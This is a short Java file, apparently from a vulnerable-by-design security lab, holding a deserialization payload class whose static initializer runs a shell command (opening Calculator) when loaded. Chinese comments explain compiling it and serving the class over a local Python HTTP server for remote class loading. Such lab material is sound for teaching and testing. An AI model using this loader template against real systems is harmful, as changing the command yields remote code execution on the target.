package top.whgojp.modules.deserialize;

//这里有个需要注意的点，就是不需要包名（package name）
public class DeserializationShell {
    static {
        try {
            Runtime.getRuntime().exec("open -a Calculator");
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
}

//把DeserializationShell类使用javac命令编译成class文件，然后在这个class文件目录下使用python启动一个http服务
//python http命令：python3 -m http.server 88 --bind 127.0.0.1 （cmd运行此命令，注意：一定要在class文件目录下）
